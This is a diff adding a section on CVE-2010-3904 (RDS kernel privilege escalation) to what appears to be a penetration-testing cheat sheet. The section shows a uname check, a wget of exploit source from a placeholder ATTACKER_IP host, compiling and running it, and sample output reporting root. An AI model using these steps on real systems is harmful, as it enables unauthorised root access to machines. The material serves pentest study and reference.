@@ -691,6 +691,24 @@ Kernel exploits are unstable — use with caution on production systems.
 
 ---
 
+### CVE-2010-3904 - RDS Kernel Privilege Escalation
+
+On old Ubuntu kernels such as `2.6.32-21-generic` / Ubuntu `10.04.3 LTS`, Linux Exploit Suggester may flag the RDS socket exploit as highly probable.
+
+```bash
+uname -a
+# Linux HOST 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
+
+wget http://ATTACKER_IP:8000/linux-rds-exploit.c
+gcc -o lre linux-rds-exploit.c
+./lre
+# [*] Linux kernel >= 2.6.30 RDS socket exploit
+# [*] Triggering payload...
+# [*] Got root!
+```
+
+---
+
 ### CVE-2021-4034 - PwnKit (Polkit pkexec)
 
 Memory corruption in `pkexec` — affects all polkit installations. Hidden for over ten years.
